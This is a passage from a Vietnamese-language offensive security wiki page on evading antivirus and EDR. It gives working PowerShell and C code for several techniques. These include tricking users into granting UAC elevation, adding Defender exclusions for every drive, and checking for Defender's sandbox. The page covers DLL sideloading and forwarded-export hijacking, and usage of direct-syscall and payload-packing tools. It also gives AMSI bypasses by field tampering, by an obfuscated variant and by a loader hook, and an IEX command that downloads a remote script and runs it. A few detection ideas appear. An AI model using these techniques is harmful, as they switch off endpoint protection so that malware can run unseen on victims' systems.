# Vượt qua Antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Trang này ban đầu được viết bởi** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Dừng Defender

- [defendnot](https://github.com/es3n1n/defendnot): Công cụ để ngăn Windows Defender hoạt động.
- [no-defender](https://github.com/es3n1n/no-defender): Công cụ giả mạo một AV khác để ngăn Windows Defender hoạt động.
- [Tắt Defender nếu bạn là admin](basic-powershell-for-pentesters/README.md)

### Dụ người dùng cấp quyền UAC kiểu trình cài đặt trước khi can thiệp vào Defender

Các loader công khai giả dạng cheat game thường được phát hành dưới dạng trình cài đặt Node.js/Nexe chưa ký, trước tiên **yêu cầu người dùng cấp quyền nâng cao**, rồi mới vô hiệu hóa Defender. Quy trình rất đơn giản:

1. Kiểm tra xem có ngữ cảnh admin hay không bằng `net session`. Lệnh này chỉ chạy thành công khi người gọi có quyền admin, vì vậy nếu thất bại thì loader đang chạy với tư cách người dùng thông thường.
2. Ngay lập tức khởi chạy lại chính nó bằng verb `RunAs` để kích hoạt lời nhắc xác nhận UAC như dự kiến, đồng thời giữ nguyên dòng lệnh ban đầu.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Nạn nhân vốn đã tin rằng họ đang cài phần mềm “crack”, nên thường chấp nhận lời nhắc, cấp cho malware quyền cần thiết để thay đổi chính sách của Defender.<sup>[[26]](#references)</sup>

### Loại trừ hàng loạt bằng `MpPreference` cho mọi ký tự ổ đĩa

Sau khi được nâng quyền, các chuỗi kiểu GachiLoader tối đa hóa những điểm mù của Defender thay vì tắt hẳn dịch vụ. Trước tiên, loader dừng tiến trình giám sát GUI (`taskkill /F /IM SecHealthUI.exe`), rồi thêm **các mục loại trừ cực kỳ rộng** để mọi hồ sơ người dùng, thư mục hệ thống và ổ đĩa di động đều không thể bị quét:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Những quan sát chính:

- Vòng lặp đi qua mọi hệ thống tệp đã gắn (D:\, E:\, USB, v.v.), vì vậy **mọi payload được thả ở bất kỳ đâu trên ổ đĩa sau này đều bị bỏ qua**.
- Việc loại trừ phần mở rộng `.sys` là để dự phòng—kẻ tấn công giữ lại lựa chọn tải driver chưa ký sau này mà không cần tác động lại Defender.
- Mọi thay đổi đều nằm trong `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, cho phép các giai đoạn sau xác nhận rằng các loại trừ vẫn còn hoặc mở rộng chúng mà không cần kích hoạt UAC lần nữa.

Vì không có dịch vụ Defender nào bị dừng, các bước kiểm tra trạng thái sơ sài vẫn báo “antivirus active”, dù tính năng kiểm tra theo thời gian thực không bao giờ quét các đường dẫn đó.<sup>[[26]](#references)</sup>

## **Phương pháp né tránh AV**

Hiện nay, AV sử dụng nhiều phương pháp khác nhau để kiểm tra xem một tệp có độc hại hay không: phát hiện tĩnh, phân tích động và, đối với các EDR tiên tiến hơn, phân tích hành vi.

### **Phát hiện tĩnh**

Phát hiện tĩnh được thực hiện bằng cách đánh dấu các chuỗi độc hại đã biết hoặc các mảng byte trong binary hay script, đồng thời trích xuất thông tin từ chính tệp đó (ví dụ: mô tả tệp, tên công ty, chữ ký số, biểu tượng, checksum, v.v.). Điều này có nghĩa là dùng các công cụ công khai đã biết có thể khiến bạn dễ bị phát hiện hơn, vì chúng có thể đã được phân tích và đánh dấu là độc hại. Có một số cách để vượt qua kiểu phát hiện này:

- **Mã hóa**

Nếu mã hóa binary, AV sẽ không thể phát hiện chương trình của bạn, nhưng bạn sẽ cần một loader nào đó để giải mã và chạy chương trình trong bộ nhớ.

- **Obfuscation**

Đôi khi, chỉ cần thay đổi một số chuỗi trong binary hoặc script là đủ để vượt qua AV, nhưng việc này có thể tốn thời gian tùy vào nội dung bạn muốn obfuscate.

- **Tự phát triển công cụ**

Nếu tự phát triển công cụ, sẽ không có signature độc hại nào được biết đến, nhưng việc này đòi hỏi nhiều thời gian và công sức.

> [!TIP]
> Một công cụ hữu ích để kiểm tra khả năng phát hiện tĩnh của Windows Defender là [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Công cụ này chia tệp thành nhiều đoạn rồi yêu cầu Defender quét riêng từng đoạn; nhờ đó, nó có thể cho bạn biết chính xác những chuỗi hoặc byte nào trong binary bị đánh dấu.

Tôi đặc biệt khuyên bạn xem [danh sách phát trên YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) này về AV Evasion thực tế.

### Kiểm tra đặc tính PE ngoại tuyến cho bộ phân loại tĩnh

Các byte payload được pack hoặc mã hóa chỉ là một trong những đầu vào của bộ phân loại tĩnh. EMBER2024 trích xuất các đặc tính PE, bao gồm imports, exports, sections, headers và dữ liệu Authenticode.<sup>[[48]](#references)</sup> Trong một thử nghiệm với loader, việc thêm 141 imports trông có vẻ lành tính đã làm giảm 93% điểm độc hại của EMBER2024, trong khi các imports thường gắn với malware lại làm tăng điểm. Đây là kết quả đối với mô hình và các mẫu đó, không phải cách đáng tin cậy để vượt qua một sản phẩm AV/EDR cụ thể.<sup>[[50]](#references)</sup>

Đối với thử nghiệm loader được cấp phép, hãy giữ nguyên payload và đường thực thi, chỉ thay đổi một biến build dự kiến cho mỗi phiên bản rồi so sánh điểm số ngoại tuyến. Kiểm tra các đặc tính PE thu được vì một thay đổi trong quá trình build có thể ảnh hưởng đến nhiều nhóm đặc tính.<sup>[[49]](#references)[[50]](#references)</sup> Để giữ các imports dự kiến trong IAT, hãy gọi các Win32 API đã chọn từ code có thể được thực thi. Thay đổi lựa chọn và phân bổ các vị trí gọi giữa các bản build thay vì tạo một hàm ngụy trang cố định có thể trở thành signature. Thử nghiệm cũng ghi nhận điểm số thấp hơn khi có code signing hợp lệ, các mục export và nhiều functions hơn làm tăng kích thước `.pdata`; signing không hợp lệ ít ảnh hưởng, còn tác động của `.pdata` là nhỏ.<sup>[[50]](#references)</sup>

Package `thrember` cung cấp chức năng trích xuất đặc tính và các mô hình benchmark. Sau khi cài đặt, hãy dùng `thrember.download_models("models")` với thư mục `models` đã tồn tại, sau đó chạy scorer từ thư mục cha: hàm tải xuống sẽ thay đổi thư mục làm việc hiện tại. Bộ phân loại PE có thể chấm điểm một thư mục chứa các bản build mà không cần gửi chúng đến dịch vụ quét:<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

Giữ cố định phiên bản model và feature-extractor trong suốt quá trình so sánh. Điểm offline thấp hơn chỉ cho thấy classifier này phản ứng thế nào với binary đã thay đổi; nó không chứng minh bạn đã né được phân tích hành vi, giả lập hay model khác của nhà cung cấp.<sup>[[49]](#references)[[50]](#references)</sup> Để xem [polymorphism theo từng bản build và ngụy trang binary bên ngoài trong payload được ảo hóa](virtualized-payload-execution.md#camouflaging-the-outer-go-executable), hãy tham khảo mô hình thực thi riêng.

### **Phân tích động**

Phân tích động là khi AV chạy binary của bạn trong sandbox và theo dõi hoạt động độc hại (ví dụ: tìm cách giải mã và đọc mật khẩu trình duyệt, thực hiện minidump trên LSASS, v.v.). Phần này có thể hơi khó xử lý hơn, nhưng sau đây là một số cách bạn có thể dùng để né sandbox.

- **Ngủ trước khi thực thi** Tùy vào cách triển khai, đây có thể là cách rất hiệu quả để vượt qua phân tích động của AV. AV có rất ít thời gian để quét file nhằm tránh làm gián đoạn quy trình làm việc của người dùng, vì vậy, thời gian ngủ dài có thể cản trở quá trình phân tích binary. Vấn đề là nhiều sandbox của AV có thể bỏ qua thời gian ngủ, tùy vào cách triển khai.
- **Kiểm tra tài nguyên của máy** Sandbox thường có rất ít tài nguyên để sử dụng (ví dụ: < 2GB RAM), nếu không, chúng có thể làm chậm máy của người dùng. Bạn cũng có thể sáng tạo hơn, chẳng hạn kiểm tra nhiệt độ CPU hoặc thậm chí tốc độ quạt; không phải thứ gì cũng được triển khai trong sandbox.
- **Kiểm tra riêng cho từng máy** Nếu muốn nhắm đến người dùng có workstation tham gia domain "contoso.local", bạn có thể kiểm tra domain của máy tính để xem có khớp với domain đã chỉ định hay không. Nếu không khớp, bạn có thể cho chương trình thoát.

Hóa ra tên máy tính trong Sandbox của Microsoft Defender là HAL9TH. Vì vậy, bạn có thể kiểm tra tên máy tính trong malware trước khi kích hoạt; nếu tên là HAL9TH, tức là bạn đang ở trong sandbox của Defender, và có thể cho chương trình thoát.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>nguồn: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Một số mẹo hữu ích khác từ [@mgeeky](https://twitter.com/mariuszbit) để đối phó với Sandbox

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> kênh #malware-dev</p></figcaption></figure>

Như đã nói trước đó trong bài viết này, **các công cụ công khai** rồi cũng sẽ **bị phát hiện**, vì vậy, bạn nên tự hỏi điều này:

Ví dụ, nếu muốn dump LSASS, **bạn có thực sự cần dùng mimikatz không**? Hay bạn có thể dùng một project khác ít được biết đến hơn nhưng cũng dump được LSASS?

Câu trả lời đúng có lẽ là phương án sau. Lấy mimikatz làm ví dụ: đây có lẽ là một trong những malware, nếu không muốn nói là malware bị AV và EDR gắn cờ nhiều nhất. Dù bản thân project này rất tuyệt, việc dùng nó để né AV cũng vô cùng khó khăn, vì vậy hãy tìm các giải pháp thay thế phù hợp với mục tiêu của bạn.

> [!TIP]
> Khi chỉnh sửa payload để né phát hiện, hãy nhớ **tắt tính năng tự động gửi mẫu** trong Defender; và nghiêm túc mà nói, **ĐỪNG TẢI LÊN VIRUSTOTAL** nếu mục tiêu của bạn là né phát hiện về lâu dài. Nếu muốn kiểm tra payload có bị một AV cụ thể phát hiện hay không, hãy cài AV đó trong VM, thử tắt tính năng tự động gửi mẫu rồi kiểm tra tại đó cho đến khi bạn hài lòng với kết quả.

## EXEs vs DLLs

Khi có thể, hãy luôn **ưu tiên dùng DLL để né phát hiện**. Theo kinh nghiệm của tôi, file DLL thường **ít bị phát hiện và phân tích hơn nhiều**, vì vậy đây là một mẹo rất đơn giản để tránh bị phát hiện trong một số trường hợp (tất nhiên là nếu payload của bạn có cách chạy dưới dạng DLL).

Như trong hình này, DLL Payload của Havoc có tỷ lệ phát hiện 4/26 trên antiscan.me, trong khi payload EXE có tỷ lệ phát hiện 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>So sánh trên antiscan.me giữa payload EXE Havoc thông thường và DLL Havoc thông thường</p></figcaption></figure>

Tiếp theo, chúng ta sẽ trình bày một số mẹo sử dụng file DLL để ẩn mình tốt hơn.

## DLL Sideloading & Proxying

**DLL Sideloading** tận dụng thứ tự tìm kiếm DLL mà loader sử dụng bằng cách đặt ứng dụng nạn nhân và payload độc hại cạnh nhau.

Bạn có thể dùng [Siofra](https://github.com/Cybereason/siofra) và script powershell sau để tìm các chương trình dễ bị DLL Sideloading:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Lệnh này sẽ xuất danh sách các chương trình trong "C:\Program Files\\" có thể bị DLL hijacking, cùng với các tệp DLL mà chúng cố tải.

Tôi rất khuyến khích bạn **tự tìm hiểu các chương trình có thể bị DLL Hijack/Sideload**. Nếu thực hiện đúng cách, kỹ thuật này khá stealthy, nhưng nếu dùng các chương trình DLL Sideload đã được công khai, bạn có thể dễ dàng bị phát hiện.

Chỉ đặt một DLL độc hại có tên mà chương trình dự kiến tải sẽ không khiến payload của bạn được tải, vì chương trình cần một số hàm cụ thể bên trong DLL đó. Để khắc phục vấn đề này, chúng ta sẽ dùng một kỹ thuật khác gọi là **DLL Proxying/Forwarding**.

**DLL Proxying** chuyển tiếp các lệnh gọi mà chương trình thực hiện từ DLL proxy (độc hại) sang DLL gốc, nhờ đó giữ nguyên chức năng của chương trình và cho phép thực thi payload của bạn.

Tôi sẽ sử dụng dự án [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) của [@flangvik](https://twitter.com/Flangvik/).

Sau đây là các bước tôi đã thực hiện:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Lệnh cuối cùng sẽ cung cấp cho chúng ta 2 tệp: một mẫu mã nguồn DLL và DLL gốc đã được đổi tên.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Đây là kết quả:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Cả shellcode của chúng ta (được mã hóa bằng [SGN](https://github.com/EgeBalci/sgn)) lẫn proxy DLL đều có tỷ lệ phát hiện 0/26 trên [antiscan.me](https://antiscan.me)! Tôi cho rằng như vậy là thành công.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Tôi **rất khuyến khích** bạn xem [VOD trên Twitch của S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) về DLL Sideloading, đồng thời xem [video của ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE) để tìm hiểu kỹ hơn về những gì chúng ta đã thảo luận.

### Lạm dụng Forwarded Exports (ForwardSideLoading)

Các module Windows PE có thể export những hàm thực chất là “forwarder”: thay vì trỏ đến mã, mục export chứa một chuỗi ASCII theo dạng `TargetDll.TargetFunc`. Khi một bên gọi phân giải export này, Windows loader sẽ:

- Tải `TargetDll` nếu nó chưa được tải
- Phân giải `TargetFunc` từ module đó

Các hành vi chính cần nắm:
- Nếu `TargetDll` là KnownDLL, nó sẽ được cung cấp từ namespace KnownDLLs được bảo vệ (ví dụ: ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Nếu `TargetDll` không phải KnownDLL, thứ tự tìm kiếm DLL thông thường sẽ được sử dụng; trong đó có thư mục của module đang thực hiện việc phân giải forward.

Điều này tạo ra một primitive sideloading gián tiếp: tìm một DLL đã ký có hàm được forward đến tên module không phải KnownDLL, sau đó đặt DLL đã ký đó cùng thư mục với một DLL do kẻ tấn công kiểm soát và có tên trùng khớp chính xác với module đích được forward đến. Khi hàm export được forward được gọi, loader sẽ phân giải forward và tải DLL của bạn từ cùng thư mục, qua đó thực thi DllMain.<sup>[[13]](#references)</sup>

Ví dụ quan sát được trên Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` không phải là KnownDLL, vì vậy nó được phân giải theo thứ tự tìm kiếm thông thường.

PoC (sao chép-dán):
1) Sao chép DLL hệ thống đã ký vào một thư mục có thể ghi
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Đặt một `NCRYPTPROV.dll` độc hại vào cùng thư mục. Chỉ cần một `DllMain` tối giản để thực thi mã; bạn không cần triển khai hàm được forward để kích hoạt `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Kích hoạt chuyển tiếp bằng một LOLBin đã được ký:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Hành vi quan sát được:
- rundll32 (đã ký) tải `keyiso.dll` side-by-side (đã ký)
- Khi phân giải `KeyIsoSetAuditingInterface`, loader đi theo forward đến `NCRYPTPROV.SetAuditingInterface`
- Sau đó, loader tải `NCRYPTPROV.dll` từ `C:\test` và thực thi `DllMain` của nó
- Nếu `SetAuditingInterface` chưa được triển khai, bạn chỉ nhận được lỗi "missing API" sau khi `DllMain` đã chạy

Mẹo tìm kiếm:
- Tập trung vào các export được forward mà module đích không phải là KnownDLL. KnownDLL được liệt kê trong `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Bạn có thể liệt kê các export được forward bằng các công cụ như:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Xem danh sách forwarder của Windows 11 để tìm các ứng viên: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ý tưởng phát hiện/phòng thủ:
- Giám sát LOLBins (ví dụ: rundll32.exe) tải các DLL đã ký từ đường dẫn không thuộc hệ thống, sau đó tải các DLL không phải KnownDLLs có cùng tên cơ sở từ thư mục đó
- Cảnh báo về chuỗi tiến trình/module như: `rundll32.exe` → `keyiso.dll` không thuộc hệ thống → `NCRYPTPROV.dll` trong các đường dẫn mà người dùng có quyền ghi
- Áp dụng các chính sách toàn vẹn mã (WDAC/AppLocker) và chặn quyền ghi+thực thi trong các thư mục ứng dụng

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze là bộ công cụ payload dùng để bypass EDR bằng các tiến trình bị tạm ngưng, direct syscalls và các phương thức thực thi thay thế`

Bạn có thể dùng Freeze để tải và thực thi shellcode một cách kín đáo.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion chỉ là trò chơi mèo vờn chuột; thứ hoạt động hôm nay có thể bị phát hiện vào ngày mai. Vì vậy, đừng bao giờ chỉ dựa vào một công cụ; nếu có thể, hãy thử kết hợp nhiều kỹ thuật evasion.

## Direct/Indirect Syscalls & Giải quyết SSN (SysWhispers4)

EDR thường đặt **user-mode inline hooks** lên các syscall stub của `ntdll.dll`. Để bypass các hook đó, bạn có thể tạo các syscall stub **direct** hoặc **indirect** để nạp **SSN** (System Service Number) chính xác và chuyển sang kernel mode mà không thực thi entrypoint export bị hook.<sup>[[32]](#references)</sup>

**Các tùy chọn gọi:**
- **Direct (embedded)**: tạo lệnh `syscall`/`sysenter`/`SVC #0` trong stub được tạo (không gọi export của `ntdll`).
- **Indirect**: nhảy vào một gadget `syscall` hiện có bên trong `ntdll` để quá trình chuyển sang kernel có vẻ bắt nguồn từ `ntdll` (hữu ích khi evasion heuristic); **randomized indirect** chọn một gadget từ pool cho mỗi lần gọi.
- **Egg-hunt**: tránh nhúng chuỗi opcode tĩnh `0F 05` trên đĩa; tìm một chuỗi syscall lúc runtime.

**Các chiến lược giải quyết SSN chống chịu hook:**
- **FreshyCalls (VA sort)**: suy ra SSN bằng cách sắp xếp syscall stub theo địa chỉ ảo thay vì đọc byte của stub.
- **SyscallsFromDisk**: ánh xạ một `\KnownDlls\ntdll.dll` sạch, đọc SSN từ `.text` của nó, rồi bỏ ánh xạ (bypass tất cả hook trong bộ nhớ).
- **RecycledGate**: kết hợp suy luận SSN dựa trên sắp xếp VA với xác thực opcode khi stub sạch; chuyển sang suy luận VA nếu bị hook.
- **HW Breakpoint**: đặt DR0 tại lệnh `syscall` và dùng VEH để lấy SSN từ `EAX` lúc runtime mà không phân tích byte đã bị hook.

Ví dụ sử dụng SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI được tạo ra để ngăn chặn "[malware không tệp](https://en.wikipedia.org/wiki/Fileless_malware)". Ban đầu, AV chỉ có khả năng quét **các tệp trên ổ đĩa**, nên nếu bạn có thể thực thi payload **trực tiếp trong bộ nhớ** bằng cách nào đó, AV sẽ không thể ngăn chặn vì không có đủ khả năng quan sát.

Tính năng AMSI được tích hợp vào các thành phần Windows sau:

- User Account Control, hay UAC (nâng quyền EXE, COM, MSI hoặc cài đặt ActiveX)
- PowerShell (script, sử dụng tương tác và đánh giá mã động)
- Windows Script Host (wscript.exe và cscript.exe)
- JavaScript và VBScript
- Macro Office VBA

Tính năng này cho phép các giải pháp antivirus kiểm tra hành vi của script bằng cách cung cấp nội dung script ở dạng không mã hóa và không làm rối.

Chạy `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` sẽ tạo cảnh báo sau trong Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Hãy chú ý cách nó thêm tiền tố `amsi:` rồi đến đường dẫn của executable chạy script; trong trường hợp này là powershell.exe.

Chúng ta không ghi tệp nào xuống ổ đĩa, nhưng vẫn bị phát hiện trong bộ nhớ do AMSI.

Ngoài ra, kể từ **.NET 4.8**, mã C# cũng được quét qua AMSI. Điều này thậm chí ảnh hưởng đến `Assembly.Load(byte[])` khi dùng để tải mã thực thi trong bộ nhớ. Vì vậy, nên dùng các phiên bản .NET thấp hơn (chẳng hạn 4.7.2 trở xuống) để thực thi trong bộ nhớ nếu muốn né AMSI.

Có một vài cách để vượt qua AMSI:

- **Làm rối mã**

Vì AMSI chủ yếu dựa vào phát hiện tĩnh, việc sửa đổi các script bạn định tải có thể là một cách hiệu quả để né phát hiện.

Tuy nhiên, AMSI có khả năng gỡ rối script ngay cả khi chúng có nhiều lớp, nên làm rối mã có thể không phải là lựa chọn tốt, tùy vào cách thực hiện. Vì vậy, việc né phát hiện không đơn giản. Dù vậy, đôi khi chỉ cần đổi tên một vài biến là đủ, nên hiệu quả còn tùy thuộc vào mức độ mà nội dung đã bị đánh dấu.

- **AMSI Bypass**

Vì AMSI được triển khai bằng cách tải DLL vào tiến trình powershell (cũng như cscript.exe, wscript.exe, v.v.), nên có thể dễ dàng can thiệp vào nó, ngay cả khi đang chạy bằng tài khoản người dùng không có đặc quyền. Do lỗ hổng này trong cách triển khai AMSI, các nhà nghiên cứu đã tìm ra nhiều cách để né việc quét AMSI.

**Buộc xảy ra lỗi**

Buộc quá trình khởi tạo AMSI thất bại (amsiInitFailed) sẽ khiến tiến trình hiện tại không bắt đầu quét. Cách này ban đầu được [Matt Graeber](https://twitter.com/mattifestation) công bố và Microsoft đã phát triển một signature để ngăn việc sử dụng rộng rãi hơn.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Chỉ cần một dòng mã PowerShell là đủ để khiến AMSI không thể hoạt động trong tiến trình PowerShell hiện tại. Tất nhiên, chính AMSI đã phát hiện dòng này, vì vậy cần chỉnh sửa đôi chút để sử dụng kỹ thuật này.

Đây là một AMSI bypass đã chỉnh sửa mà tôi lấy từ [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Keep in mind, điều này có thể sẽ bị phát hiện sau khi bài đăng này được công bố, vì vậy bạn không nên công bố bất kỳ đoạn code nào nếu mục tiêu của bạn là không bị phát hiện.

**Memory Patching**

Kỹ thuật này ban đầu được phát hiện bởi [@RastaMouse](https://twitter.com/_RastaMouse/) và bao gồm việc tìm địa chỉ của hàm "AmsiScanBuffer" trong amsi.dll (chịu trách nhiệm quét dữ liệu đầu vào do người dùng cung cấp) rồi ghi đè hàm đó bằng các chỉ thị để trả về mã E_INVALIDARG. Nhờ vậy, kết quả quét thực tế sẽ trả về 0, được hiểu là kết quả sạch.

> [!TIP]
> Vui lòng đọc [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) để xem phần giải thích chi tiết hơn.

Ngoài ra còn có nhiều kỹ thuật khác để bypass AMSI bằng powershell. Hãy xem [**trang này**](basic-powershell-for-pentesters/index.html#amsi-bypass) và [**repo này**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) để tìm hiểu thêm về chúng.

### Chặn AMSI bằng cách ngăn amsi.dll được tải (hook LdrLoadDll)

AMSI chỉ được khởi tạo sau khi `amsi.dll` được tải vào tiến trình hiện tại. Một cách bypass mạnh mẽ, không phụ thuộc vào ngôn ngữ, là đặt một hook ở user-mode lên `ntdll!LdrLoadDll`, để hàm này trả về lỗi khi module được yêu cầu là `amsi.dll`. Nhờ vậy, AMSI không bao giờ được tải và tiến trình đó sẽ không thực hiện bất kỳ lượt quét nào.<sup>[[23]](#references)</sup>

Phác thảo cách triển khai (pseudocode C/C++ x64):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Ghi chú
- Hoạt động với PowerShell, WScript/CScript và các loader tùy chỉnh (bất cứ thứ gì nếu không thì sẽ tải AMSI).
- Kết hợp với việc gửi script qua stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) để tránh dấu vết dài trên dòng lệnh.
- Đã thấy được sử dụng bởi các loader chạy qua LOLBins (ví dụ: `regsvr32` gọi `DllRegisterServer`).

Công cụ **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** cũng tạo script để bypass AMSI.
Công cụ **[https://amsibypass.com/](https://amsibypass.com/)** cũng tạo script để bypass AMSI và tránh signature bằng cách ngẫu nhiên hóa các hàm do người dùng định nghĩa, biến, biểu thức ký tự, đồng thời áp dụng kiểu chữ hoa/thường ngẫu nhiên cho các từ khóa PowerShell để tránh signature.

**Xóa signature bị phát hiện**

Bạn có thể dùng các công cụ như **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** và **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** để xóa signature AMSI bị phát hiện khỏi bộ nhớ của tiến trình hiện tại. Công cụ này hoạt động bằng cách quét bộ nhớ của tiến trình hiện tại để tìm signature AMSI, sau đó ghi đè lên bằng các lệnh NOP, qua đó xóa signature khỏi bộ nhớ.

**Các sản phẩm AV/EDR sử dụng AMSI**

Bạn có thể tìm thấy danh sách các sản phẩm AV/EDR sử dụng AMSI tại **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Dùng PowerShell phiên bản 2**
Nếu bạn dùng PowerShell phiên bản 2, AMSI sẽ không được tải, vì vậy bạn có thể chạy script mà không bị AMSI quét. Bạn có thể làm như sau:

```bash
powershell.exe -version 2
```

## Ghi nhật ký PS

